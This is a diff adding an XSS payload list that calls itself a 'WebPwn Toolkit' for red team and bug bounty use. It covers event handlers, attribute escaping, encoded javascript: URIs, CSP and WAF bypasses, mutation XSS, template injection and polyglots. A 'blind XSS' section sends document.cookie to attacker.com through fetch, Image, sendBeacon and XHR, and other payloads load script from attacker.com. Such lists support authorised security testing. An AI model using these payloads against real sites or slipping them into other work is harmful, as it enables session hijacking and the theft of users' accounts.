@@ -1,0 +1,287 @@
+# ============================================================
+# WebPwn Toolkit - Advanced XSS Payloads
+# Level: Advanced / Red Team / Bug Bounty
+# Categories: Reflected, Stored, DOM, CSP Bypass,
+#             WAF Bypass, Mutation, Framework, Polyglot
+# ============================================================
+
+# ──────────────────────────────────────────
+# [1] CLASSIC / BASIC
+# ──────────────────────────────────────────
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<script>alert(window.origin)</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<script>console.log(1)</script>
+
+# ──────────────────────────────────────────
+# [2] HTML EVENT HANDLERS
+# ──────────────────────────────────────────
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(document.cookie)>
+<img src=x onerror=alert(document.domain)>
+<img src="x" onerror="alert(1)">
+<img src='x' onerror='alert(1)'>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onhashchange=alert(1)>
+<body onerror=alert(1)>
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1) autofocus>
+<input onkeydown=alert(1)>
+<input onkeyup=alert(1)>
+<input onkeypress=alert(1)>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<details open ontoggle=alert(1)>
+<details ontoggle=alert(1) open>
+<video src=1 onerror=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=1 onerror=alert(1)>
+<audio onerror=alert(1)>
+<a href=javascript:alert(1)>click</a>
+<a href="javascript:alert(1)">click</a>
+<a href=j&#97;vascript:alert(1)>click</a>
+<a onmouseover=alert(1)>hover</a>
+<a onclick=alert(1)>click</a>
+<iframe src="javascript:alert(1)">
+<iframe onload=alert(1)>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<form><button formaction=javascript:alert(1)>click</button></form>
+<isindex action=javascript:alert(1) type=image>
+<keygen onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>XSS</marquee>
+<div onmouseover=alert(1)>hover</div>
+<div onclick=alert(1)>click</div>
+<p onmouseover=alert(1)>hover</p>
+
+# ──────────────────────────────────────────
+# [3] ATTRIBUTE INJECTION (CONTEXT ESCAPING)
+# ──────────────────────────────────────────
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+" onmouseover="alert(1)"
+' onmouseover='alert(1)'
+" onfocus="alert(1)" autofocus="
+" onblur="alert(1)" autofocus="
+"><body onload=alert(1)>
+"><details open ontoggle=alert(1)>
+" style="animation-name:rotation" onanimationstart="alert(1)
+"><a href=javascript:alert(1)>click</a>
+"><iframe src=javascript:alert(1)>
+"></script><script>alert(1)</script>
+
+# ──────────────────────────────────────────
+# [4] JAVASCRIPT PROTOCOL
+# ──────────────────────────────────────────
+javascript:alert(1)
+javascript:alert(document.cookie)
+javascript:alert(document.domain)
+javascript:prompt(1)
+javascript:confirm(1)
+javascript:eval('alert(1)')
+javascript:void(alert(1))
+Javascript:alert(1)
+JAVASCRIPT:alert(1)
+j&#97;vascript:alert(1)
+j&#x61;vascript:alert(1)
+&#106;avascript:alert(1)
+&#x6a;avascript:alert(1)
+jav&#9;ascript:alert(1)
+jav&#10;ascript:alert(1)
+jav&#12;ascript:alert(1)
+java\0script:alert(1)
+java&#0;script:alert(1)
+javascript&#58;alert(1)
+
+# ──────────────────────────────────────────
+# [5] DOM-BASED XSS
+# ──────────────────────────────────────────
+#<img src=x onerror=alert(1)>
+#<script>alert(1)</script>
+javascript:alert(1)//#
+<img src=x onerror=alert(location.hash)>
+"><img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+<script>eval(location.hash.slice(1))</script>
+<script>setTimeout('alert(1)',0)</script>
+<script>setInterval('alert(1)',1000)</script>
+<script>new Function('alert(1)')()</script>
+<script>window['ale'+'rt'](1)</script>
+<script>window['\x61\x6c\x65\x72\x74'](1)</script>
+<script>this['ale'+'rt'](1)</script>
+<script>self['ale'+'rt'](1)</script>
+<img src=x onerror=this.onerror=null;document.write('<script>alert(1)<\/script>')>
+<script>location='javascript:alert(1)'</script>
+<script>location.href='javascript:alert(1)'</script>
+<script>document.location='javascript:alert(1)'</script>
+<script>window.location='javascript:alert(1)'</script>
+
+# ──────────────────────────────────────────
+# [6] CSP BYPASS
+# ──────────────────────────────────────────
+# Nonce bypass (if nonce is predictable)
+<script nonce="">alert(1)</script>
+# Unsafe-inline + strict-dynamic bypass
+<script src=//attacker.com/evil.js>
+<script src=data:text/javascript,alert(1)>
+# Base tag injection
+<base href=//attacker.com/>
+# JSONP abuse
+<script src=//accounts.google.com/o/oauth2/revoke?callback=alert(1)>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js" integrity="...">
+# Angular CSP bypass
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.0/angular.min.js">
+<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
+<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
+# data: URI bypass
+<object data=data:text/html,<script>alert(1)</script>>
+<iframe src="data:text/html,<script>alert(1)</script>">
+<iframe srcdoc="<script>alert(1)</script>">
+# Meta refresh
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+
+# ──────────────────────────────────────────
+# [7] WAF BYPASS
+# ──────────────────────────────────────────
+# Case variation
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<sCrIpT>alert(1)</sCrIpT>
+# Space/newline bypass
+<script >alert(1)</script >
+<script	>alert(1)</script>
+<scr ipt>alert(1)</scr ipt>
+<img	src=x onerror=alert(1)>
+# URL encoding
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+%3Cimg+src%3Dx+onerror%3Dalert(1)%3E
+# Double URL encoding
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+# HTML entity encoding
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
+# Unicode encoding
+\u003cscript\u003ealert(1)\u003c/script\u003e
+# Null byte injection
+<scr\x00ipt>alert(1)</scr\x00ipt>
+<scr%00ipt>alert(1)</scr%00ipt>
+<img src="x" onerr\x00or="alert(1)">
+# Backtick bypass
+<img src=`x` onerror=`alert(1)`>
+# Parentheses-free XSS
+<img src=x onerror=alert`1`>
+<script>alert`1`</script>
+<svg onload=alert`1`>
+# Closing tag bypass
+</script><script>alert(1)</script>
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</style><script>alert(1)</script>
+# Comment bypass
+<sc<!---->ript>alert(1)</sc<!---->ript>
+# Long payload obfuscation
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
+
+# ──────────────────────────────────────────
+# [8] MUTATION XSS (mXSS)
+# ──────────────────────────────────────────
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<p style="animation: x" onanimationstart="alert(1)">
+<p id="</p><img src=x onerror=alert(1)>">
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributeName=x dur=1s>
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='x' onerror='alert(1)'/></svg>#x">
+<math><maction actiontype="statusline#http://attacker.com" xlink:href="javascript:alert(1)">click</maction></math>
+<form id=x></form><button form=x formaction=javascript:alert(1)>click</button>
+<svg><script>alert(1)</script></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
+<svg><![CDATA[<script>alert(1)</script>]]></svg>
+
+# ──────────────────────────────────────────
+# [9] FRAMEWORK / TEMPLATE INJECTION XSS
+# ──────────────────────────────────────────
+# AngularJS SSTI → XSS
+{{constructor.constructor('alert(1)')()}}
+{{$eval.constructor('alert(1)')()}}
+{{['alert(1)'].map($root.constructor.fromCharCode.apply.bind($root.constructor.fromCharCode,$root))}}
+{{{}.__proto__.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
+# Vue.js
+{{constructor.constructor('alert(1)')()}}
+# React (dangerouslySetInnerHTML)
+{{"__html": "<img src=x onerror=alert(1)>"}}
+# Jinja2 / Twig (SSTI → XSS)
+{{7*7}}
+{{config.items()}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+
+# ──────────────────────────────────────────
+# [10] STORED XSS VIA DIFFERENT TAGS
+# ──────────────────────────────────────────
+<math><mi//xlink:href="data:x,<script>alert(1)</script>">
+<table><td background="javascript:alert(1)">
+<div style="background-image: url(javascript:alert(1))">
+<div style="behavior: url(data:text/x-component,<script>alert(1)</script>)">
+<input type="image" src="javascript:alert(1)">
+<link rel="stylesheet" href="javascript:alert(1)">
+<link rel="import" href="data:text/html,<script>alert(1)</script>">
+<style>@import 'javascript:alert(1)'</style>
+<xss id=x tabindex=1 onfocus=alert(1)></xss>
+<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
+<xml id="X"><a><b>&lt;img src="x" onerror="alert(1)"/&gt;</b></a></xml>
+<p id="a">XXX<img src="x"/onerror=alert(1)></p>
+
+# ──────────────────────────────────────────
+# [11] POLYGLOT PAYLOADS (Multi-context)
+# ──────────────────────────────────────────
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNLoAd=alert('XSS')//
+'>"><img src=x onerror=alert(1)>
+'"><img src=x onerror=alert(1)><!--
+</script><script>alert(1)</script>
+<script src="//attacker.com/evil.js"></script>
+\"><svg/onload=alert(1)>
+';alert(1)//
+";alert(1)//
+``;alert(1)//
+</title></script><script>alert(1)</script>
+--><script>alert(1)</script>
+-->alert(1)//
+*/{alert(1)}/*
+</style></script><script>alert(1)</script>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+# ──────────────────────────────────────────
+# [12] BLIND XSS (Out-of-Band Confirmation)
+# ──────────────────────────────────────────
+<script>new Image().src='http://attacker.com/?c='+document.cookie</script>
+<script>fetch('http://attacker.com/?c='+document.cookie)</script>
+<script>fetch('http://attacker.com/',{method:'POST',body:document.cookie})</script>
+<script>document.location='http://attacker.com/?c='+document.cookie</script>
+<img src=x onerror="this.src='http://attacker.com/?c='+document.cookie">
+<script>var i=new Image;i.src='http://attacker.com/?x='+document.cookie</script>
+<script>navigator.sendBeacon('http://attacker.com/',document.cookie)</script>
+<script>xmlhttp=new XMLHttpRequest();xmlhttp.open('GET','http://attacker.com/?c='+document.cookie,true);xmlhttp.send();</script>
+<svg/onload=fetch('http://attacker.com/?x='+btoa(document.cookie))>
+
+# ──────────────────────────────────────────
+# [13] WEBPWN UNIQUE MARKERS
+# ──────────────────────────────────────────
+WEBPWN_XSS_MARKER_12345
+<script>WEBPWN_XSS_EXEC_12345</script>
+<img src=x onerror=WEBPWN_XSS_ONERROR_12345>
